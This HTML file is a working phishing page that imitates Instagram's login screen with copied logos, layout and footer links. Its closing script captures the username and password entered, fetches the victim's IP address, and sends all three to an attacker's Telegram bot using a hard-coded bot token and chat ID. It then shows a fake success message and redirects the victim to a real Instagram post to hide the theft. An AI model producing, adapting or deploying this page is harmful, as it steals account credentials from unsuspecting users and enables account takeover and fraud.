<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNP-OH0_0b.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 935px;
            margin: 0 auto;
        }

        .phone-image {
            margin-right: 32px;
            position: relative;
        }

        .phone-image img {
            width: 380px;
            height: 580px;
        }

        .phone-screen {
            position: absolute;
            top: 26px;
            left: 112px;
            width: 250px;
            height: 541px;
            background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png');
            background-size: cover;
            background-position: center;
            border-radius: 2px;
        }

        .login-container {
            width: 350px;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }

        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }

        .login-form {
            margin-top: 24px;
        }

        .input-field {
            width: 100%;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            margin-top: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .login-button:disabled {
            background-color: #b2dffc;
            cursor: default;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .divider-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            cursor: pointer;
        }

        .facebook-login i {
            margin-right: 8px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
            cursor: pointer;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            margin-bottom: 10px;
        }

        .signup-text {
            font-size: 14px;
            color: #262626;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
        }

        .get-app-text {
            font-size: 14px;
            margin: 10px 0;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-store img {
            height: 40px;
        }

        .footer {
            max-width: 935px;
            margin: 0 auto;
            padding: 20px 0;
            text-align: center;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-link {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        #message {
            margin-top: 10px;
            font-size: 14px;
            text-align: center;
        }

        .success {
            color: green;
        }

        .error {
            color: red;
        }

        @media (max-width: 875px) {
            .phone-image {
                display: none;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="phone-image">
            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram on phone">
            <div class="phone-screen"></div>
        </div>
        <div class="login-container">
            <div class="login-box">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
                <form class="login-form" id="loginForm">
                    <input type="text" class="input-field" id="username" placeholder="Phone number, username, or email" required>
                    <input type="password" class="input-field" id="password" placeholder="Password" required>
                    <button type="submit" class="login-button" id="loginButton">Log In</button>
                </form>
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OR</div>
                    <div class="divider-line"></div>
                </div>
                <div class="facebook-login">
                    <i class="fab fa-facebook-square"></i> Log in with Facebook
                </div>
                <div class="forgot-password">Forgot password?</div>
            </div>
            <div class="signup-box">
                <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
            </div>
            <div class="get-app">
                <p class="get-app-text">Get the app.</p>
                <div class="app-stores">
                    <div class="app-store">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on App Store">
                    </div>
                    <div class="app-store">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
                    </div>
                </div>
            </div>
            <div id="message"></div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Meta</a>
            <a href="#" class="footer-link">About</a>
            <a href="#" class="footer-link">Blog</a>
            <a href="#" class="footer-link">Jobs</a>
            <a href="#" class="footer-link">Help</a>
            <a href="#" class="footer-link">API</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Terms</a>
            <a href="#" class="footer-link">Locations</a>
            <a href="#" class="footer-link">Instagram Lite</a>
            <a href="#" class="footer-link">Threads</a>
            <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
            <a href="#" class="footer-link">Meta Verified</a>
        </div>
        <div class="copyright">
            Â© 2023 Instagram from Meta
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');
            const messageDiv = document.getElementById('message');
            
            // Disable login button
            loginButton.disabled = true;
            loginButton.textContent = 'Logging in...';
            
            try {
                // Get user's IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Send data to Telegram bot
                const botToken = '8596151835:AAETvEBqIS0QCqCMWTFBehheGpLK1FYYXwM';
                const chatId = '6957293275';
                const text = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIP}`;
                
                const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text
                    })
                });
                
                if (telegramResponse.ok) {
                    messageDiv.innerHTML = '<p class="success">Login successful! Redirecting...</p>';
                    // Redirect to the specified Instagram post after successful "login"
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/p/DQeWrSxjFCJ';
                    }, 1500);
                } else {
                    throw new Error('Failed to send message to Telegram');
                }
            } catch (error) {
                console.error('Error:', error);
                messageDiv.innerHTML = '<p class="error">Login failed. Please try again.</p>';
            } finally {
                // Re-enable login button
                loginButton.disabled = false;
                loginButton.textContent = 'Log In';
            }
        });
    </script>
</body>
</html>
